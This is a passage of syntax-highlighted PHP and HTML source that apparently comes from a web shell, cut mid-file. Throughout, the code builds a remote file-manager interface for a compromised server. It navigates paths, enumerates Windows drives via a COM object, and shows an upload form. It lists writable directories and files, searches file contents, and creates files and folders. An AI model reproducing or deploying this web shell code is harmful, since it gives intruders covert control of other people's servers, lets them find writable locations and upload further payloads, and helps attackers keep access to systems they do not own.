<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">path</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">n</span>=<span style="color: #cccccc; background-color: #2d2d2d;">count(</span>$<span style="color: #ffcc66;">path</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;$<span style="color: #ffcc66;">i</span>&lt;$<span style="color: #ffcc66;">n</span>-<span style="color: #cccccc; background-color: #2d2d2d;">1</span>;$<span style="color: #ffcc66;">i</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cwd_links</span> .= <span style="color: #66cccc;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">j</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;$<span style="color: #ffcc66;">j</span>&lt;=$<span style="color: #ffcc66;">i</span>;$<span style="color: #ffcc66;">j</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cwd_links</span> .= $<span style="color: #ffcc66;">path</span>[$<span style="color: #ffcc66;">j</span>].<span style="color: #66cccc;">'/'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cwd_links</span> .= <span style="color: #66cccc;">'\');"&gt;'</span>.$<span style="color: #ffcc66;">path</span>[$<span style="color: #ffcc66;">i</span>].<span style="color: #66cccc;">'/&lt;/a&gt;'</span>;
<span style="background-color: #515151;"> </span>   }

<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;script</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"text/javascript"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #f2777a; font-weight: bold;">document</span>.<span style="color: #f2777a; font-weight: bold;">onclick</span> = <span style="color: #f2777a; font-weight: bold;">shownav</span>;
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">shownav</span>(<span style="color: #f2777a; font-weight: bold;">e</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">src</span> = <span style="color: #f2777a; font-weight: bold;">e</span>?<span style="color: #f2777a; font-weight: bold;">e</span>.<span style="color: #f2777a; font-weight: bold;">target</span>:<span style="color: #f2777a; font-weight: bold;">event</span>.<span style="color: #f2777a; font-weight: bold;">srcElement</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">do</span>{
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">src</span>.<span style="color: #f2777a; font-weight: bold;">id</span> ==<span style="color: #66cccc;">"jumpto"</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'inputnav'</span>).<span style="color: #f2777a; font-weight: bold;">style</span>.<span style="color: #f2777a; font-weight: bold;">display</span> = <span style="color: #66cccc;">""</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'pathnav'</span>).<span style="color: #f2777a; font-weight: bold;">style</span>.<span style="color: #f2777a; font-weight: bold;">display</span> = <span style="color: #66cccc;">"none"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">hidenav();</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">src</span>.<span style="color: #f2777a; font-weight: bold;">id</span> ==<span style="color: #66cccc;">"inputnav"</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">src</span> = <span style="color: #f2777a; font-weight: bold;">src</span>.<span style="color: #f2777a; font-weight: bold;">parentNode</span>;
<span style="background-color: #515151;"> </span>   }<span style="color: #99cc99;">while</span>(<span style="color: #f2777a; font-weight: bold;">src</span>.<span style="color: #f2777a; font-weight: bold;">parentNode</span>)

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'inputnav'</span>).<span style="color: #f2777a; font-weight: bold;">style</span>.<span style="color: #f2777a; font-weight: bold;">display</span> = <span style="color: #66cccc;">"none"</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'pathnav'</span>).<span style="color: #f2777a; font-weight: bold;">style</span>.<span style="color: #f2777a; font-weight: bold;">display</span> = <span style="color: #66cccc;">""</span>;
}
<span style="color: #6699cc;">&lt;/script&gt;</span>
<span style="color: #6699cc;">&lt;div</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"background:#eee;margin-bottom:10px;"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;table</span> <span style="color: #6699cc;">id=</span><span style="color: #66cccc;">"pathnav"</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span> <span style="color: #6699cc;">border=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">cellpadding=</span><span style="color: #66cccc;">"5"</span> <span style="color: #6699cc;">cellspacing=</span><span style="color: #66cccc;">"0"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;tr&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span><span style="color: #6699cc;">&gt;</span><span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">cwd_links</span>.<span style="color: #66cccc;">' - '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">nowpath</span>).<span style="color: #66cccc;">' / </span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">getPerms(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">getUser(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #99cc99; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #ffcc66; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #6699cc; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td</span> <span style="color: #f2777a; font-weight: bold;">nowrap</span><span style="color: #6699cc;">&gt;&lt;input</span> <span style="color: #6699cc;">class=</span><span style="color: #66cccc;">"bt"</span> <span style="color: #6699cc;">id=</span><span style="color: #66cccc;">"jumpto"</span> <span style="color: #6699cc;">name=</span><span style="color: #66cccc;">"jumpto"</span> <span style="color: #6699cc;">value=</span><span style="color: #66cccc;">"Jump t</span><span style="color: #66cccc; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">type=</span><span style="color: #66cccc; text-decoration: underline;">"button"</span><span style="color: #6699cc; text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/tr&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/table&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;table</span> <span style="color: #6699cc;">id=</span><span style="color: #66cccc;">"inputnav"</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span> <span style="color: #6699cc;">border=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">cellpadding=</span><span style="color: #66cccc;">"5"</span> <span style="color: #6699cc;">cellspacing=</span><span style="color: #66cccc;">"0"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">style=</span><span style="color: #66cccc; text-decoration: underline;">"display:none;"</span><span style="color: #6699cc; text-decoration: underline;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;form</span> <span style="color: #6699cc;">action=</span><span style="color: #66cccc;">""</span> <span style="color: #6699cc;">method=</span><span style="color: #66cccc;">"post"</span> <span style="color: #6699cc;">id=</span><span style="color: #66cccc;">"godir"</span> <span style="color: #6699cc;">name=</span><span style="color: #66cccc;">"godir"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;tr&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td</span> <span style="color: #f2777a; font-weight: bold;">nowrap</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Current</span> <span style="color: #cccccc; background-color: #2d2d2d;">Directory (</span><span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">dir_writeable</span>;<span style="color: #cc99cc;">?&gt;</span>, <span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">ec</span><span style="color: #99cc99; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">getChmod(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #6699cc; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span><span style="color: #6699cc;">&gt;&lt;input</span> <span style="color: #6699cc;">name=</span><span style="color: #66cccc;">"view_writable"</span> <span style="color: #6699cc;">value=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"hidden"</span><span style="text-decoration: underline;"> /</span><span style="color: #6699cc; text-decoration: underline;">&gt;&lt;input</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">class=</span><span style="color: #66cccc; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">name=</span><span style="color: #66cccc; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">value=</span><span style="color: #66cccc; text-decoration: underline;">"&lt;?php echo $nowpath;?&gt;"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">type=</span><span style="color: #66cccc; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">style=</span><span style="color: #66cccc; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #6699cc; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td</span> <span style="color: #f2777a; font-weight: bold;">nowrap</span><span style="color: #6699cc;">&gt;&lt;input</span> <span style="color: #6699cc;">class=</span><span style="color: #66cccc;">"bt"</span> <span style="color: #6699cc;">value=</span><span style="color: #66cccc;">"GO"</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"submit"</span><span style="color: #6699cc;">&gt;&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/tr&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/form&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/table&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">obj</span> = <span style="color: #99cc99;">new</span> <span style="color: #6699cc;">COM</span>(<span style="color: #66cccc;">'scripting.filesystemobject'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">obj</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_object(</span>$<span style="color: #ffcc66;">obj</span>) &amp;&amp; $<span style="color: #ffcc66;">obj</span>-<span style="color: #6699cc;">&gt;</span><span style="color: #ffcc66;">Drives</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">DriveTypeDB</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(0</span> =&gt; <span style="color: #66cccc;">'Unknow'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">1</span> =&gt; <span style="color: #66cccc;">'Removable'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">2</span> =&gt; <span style="color: #66cccc;">'Fixed'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">3</span> =<span style="text-decoration: underline;">&gt; </span><span style="color: #66cccc; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">4</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #66cccc; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">5</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #66cccc; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">comma</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">obj</span>-&gt;<span style="color: #ffcc66;">Drives</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">drive</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">drive</span>-&gt;<span style="color: #ffcc66;">Path</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">comma</span>.<span style="color: #66cccc;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #ffcc66;">drive</span>-<span style="color: #6699cc;">&gt;</span><span style="color: #ffcc66;">Path</span>.<span style="color: #66cccc;">'/\');"</span><span style="color: #66cccc; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #ffcc66; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #ffcc66; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">comma</span> = <span style="color: #66cccc;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">'&lt;/div&gt;'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;/div&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">findstr</span> = $<span style="color: #6699cc;">_POST</span>[<span style="color: #66cccc;">'findstr'</span>];
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">re</span> = $<span style="color: #6699cc;">_POST</span>[<span style="color: #66cccc;">'re'</span>];
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">tbhead(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #66cccc; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">"DOCUMENT_ROOT"</span>].<span style="color: #66cccc;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #66cccc; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffcc66;">nowpath</span>.<span style="color: #66cccc;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffcc66;">nowpath</span>.<span style="color: #66cccc;">'\',\'dir\');"&gt;</span><span style="color: #66cccc; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffcc66;">nowpath</span>.<span style="color: #66cccc;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #66cccc; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="POST"&gt;Find s</span><span style="color: #66cccc; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffcc66; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #66cccc; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #66cccc; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">view_writable</span> == <span style="color: #66cccc;">'dir'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">GetWDirList(</span>$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">view_writable</span> == <span style="color: #66cccc;">'file'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">GetWFileList(</span>$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">findstr</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span> = <span style="color: #cccccc; background-color: #2d2d2d;">GetSFileList(</span>$<span style="color: #ffcc66;">nowpath</span>, $<span style="color: #ffcc66;">findstr</span>, $<span style="color: #ffcc66;">re</span>);
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirs</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">opendir(</span>$<span style="color: #ffcc66;">dir</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">file</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">readdir(</span>$<span style="color: #ffcc66;">dirs</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filepath</span>=$<span style="color: #ffcc66;">nowpath</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">file</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(@<span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">filepath</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'filename'</span>]=$<span style="color: #ffcc66;">file</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'mtime'</span>]=<span style="color: #99cc99;">@date</span>(<span style="color: #66cccc;">'Y-m-d H:i:s'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">filepath</span>));
